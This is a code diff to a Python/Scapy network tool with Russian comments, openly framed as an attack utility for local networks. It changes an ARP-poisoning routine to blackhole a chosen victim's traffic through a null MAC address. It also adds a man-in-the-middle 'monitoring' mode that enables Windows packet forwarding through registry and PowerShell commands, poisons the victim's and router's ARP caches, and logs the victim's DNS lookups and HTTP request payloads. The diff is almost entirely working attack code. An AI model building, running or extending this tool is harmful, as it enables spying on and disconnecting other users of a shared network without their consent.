@@ -6,6 +6,8 @@ import time
 import ctypes
 from threading import Thread
 from collections import Counter
+
+from scapy.layers.dns import DNSQR
 from scapy.layers.l2 import ARP, Ether
 from scapy.sendrecv import srp, sendp, sniff, send
 from scapy.arch import get_if_addr
@@ -16,12 +18,15 @@ from scapy.layers.inet import ICMP, IP
 class NetworkTool:
     def __init__(self):
         self.my_ip = get_if_addr(conf.iface)
+        self.my_mac = conf.iface.mac
+
         self.router_ip = self._get_gateway_ip()
         self.router_mac = self._get_mac(self.router_ip)
         self.network_range = ".".join(self.my_ip.split(".")[:-1]) + ".0/24"
         self.is_attacking = False
         self.target_info = {"ip": None, "mac": None, "name": None, "packets": 0}
         self.found_devices = []
+        self.query_log = []
 
     def _get_gateway_ip(self):
         if os.name == 'nt':
@@ -62,16 +67,15 @@ class NetworkTool:
         return counts.most_common(1)[0][0] if counts else None
 
     def attack_process(self):
-        """Комбинированная атака: ARP Poisoning + ICMP Redirect"""
         t_ip = self.target_info['ip']
         t_mac = self.target_info['mac']
+        fake_mac = "00:00:00:00:00:00"  # Пакеты будут уходить в черную дыру
 
-        # 1. ARP пакеты (L2)
-        # Шлем цели: "Я роутер"
-        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=self.router_ip)
-        # Шлем роутеру: "Я цель"
-        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac, psrc=t_ip)
-        # Broadcast для удержания
+        # Цели говорим: Роутер по адресу fake_mac
+        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=self.router_ip, hwsrc=fake_mac)
+        # Роутеру говорим: Цель по адресу fake_mac
+        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac, psrc=t_ip,
+                                                hwsrc=fake_mac)
         broadcast_p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=t_ip, psrc=self.router_ip)
 
         # 2. ICMP Redirect пакет (L3)
@@ -113,6 +117,62 @@ class NetworkTool:
                 return
             time.sleep(1)
 
+    def toggle_forwarding(self, state=True):
+        """Включает/выключает пересылку пакетов в Windows"""
+        val = 1 if state else 0
+        os.system(
+            f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" /v IPEnableRouter /t REG_DWORD /d {val} /f')
+        # Включаем через PowerShell для надежности
+        ps_cmd = f'powershell "Get-NetIPInterface | Set-NetIPInterface -Forwarding {"Enabled" if state else "Disabled"}"'
+        os.system(ps_cmd)
+
+    def monitor_process(self):
+        """Режим прослушки: Трафик течет сквозь нас"""
+        t_ip = self.target_info['ip']
+        t_mac = self.target_info['mac']
+
+        self.toggle_forwarding(True)
+
+        # Пакеты: hwsrc=self.my_mac (говорим всем слать трафик нам)
+        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, psrc=self.router_ip, hwsrc=self.my_mac)
+        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, psrc=t_ip, hwsrc=self.my_mac)
+
+        print(f"[*] МОНИТОРИНГ: {t_ip} под наблюдением...")
+
+        def packet_callback(pkt):
+            if not self.is_attacking: return
+            if pkt.haslayer(DNSQR):
+                query = pkt[DNSQR].qname.decode(errors='ignore').strip('.')
+
+                # Список игнорируемого мусора
+                trash = ['microsoft', 'google', 'gvt2', 'akamaized', 'live.com', 'bing']
+                if any(t in query for t in trash): return
+
+                # Показываем только если это новый запрос (не дубль)
+                if query not in self.query_log:
+                    self.query_log.append(query)
+                    if len(self.query_log) > 20: self.query_log.pop(0)
+
+                    # Печатаем красиво с меткой времени
+                    t_str = time.strftime("%H:%M:%S")
+                    print(f"[{t_str}] ЦЕЛЬ ПЕРЕШЛА: {query}")
+
+            if pkt.haslayer(IP) and pkt.haslayer("Raw"):
+                payload = pkt["Raw"].load.decode(errors='ignore')
+                if "GET" in payload or "POST" in payload:
+                    # Пытаемся найти поисковые запросы в URL (например, ?q=hello)
+                    print(f"\n[!] ПЕРЕХВАЧЕН HTTP ЗАПРОС:\n{payload[:200]}")
+
+        # Сниффер в отдельном потоке
+        Thread(target=lambda: sniff(filter=f"host {t_ip} and udp port 53", prn=packet_callback, store=0),
+               daemon=True).start()
+
+        while self.is_attacking:
+            sendp(to_v, verbose=False)
+            sendp(to_r, verbose=False)
+            time.sleep(1.5)  # Редкий спам, чтобы не мешать трафику
+
+        self.toggle_forwarding(False)
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -137,7 +197,7 @@ def main():
         for i, d in enumerate(tool.found_devices):
             print(f"{i:2} | {d['ip'].ljust(14)} | {d['mac']} | {d['name']}")
         print("-" * 55)
-        print("1. Сканировать | 2. Атака ID | 3. По шуму | 4. СТОП | 5. Выход")
+        print("1. Сканировать | 2. Атака ID | 3. Мониторинг | 4. По шуму | 5. СТОП | 6. Выход")
 
         cmd = input(">> ")
         if cmd == '1':
@@ -146,7 +206,7 @@ def main():
             try:
                 idx = int(input("Введите ID: "))
                 target = tool.found_devices[idx]
-                tool.is_attacking = False  # Сброс старой атаки
+                tool.is_attacking = False
                 time.sleep(0.2)
                 tool.target_info.update(
                     {"ip": target['ip'], "mac": target['mac'], "name": target['name'], "packets": 0})
@@ -155,6 +215,12 @@ def main():
             except:
                 pass
         elif cmd == '3':
+            idx = int(input("Введите ID для МОНИТОРИНГА: "))
+            target = tool.found_devices[idx]
+            tool.is_attacking = True
+            tool.target_info.update({"ip": target['ip'], "mac": target['mac'], "name": target['name'], "packets": 0})
+            Thread(target=tool.monitor_process, daemon=True).start()
+        elif cmd == '4':
             noisy_ip = tool.find_noisy_guy()
             if noisy_ip:
                 mac = tool._get_mac(noisy_ip)
@@ -164,9 +230,9 @@ def main():
                     tool.target_info.update({"ip": noisy_ip, "mac": mac, "name": "Noisy Guy", "packets": 0})
                     tool.is_attacking = True
                     Thread(target=tool.attack_process, daemon=True).start()
-        elif cmd == '4':
-            tool.is_attacking = False
         elif cmd == '5':
+            tool.is_attacking = False
+        elif cmd == '6':
             tool.is_attacking = False
             break
 
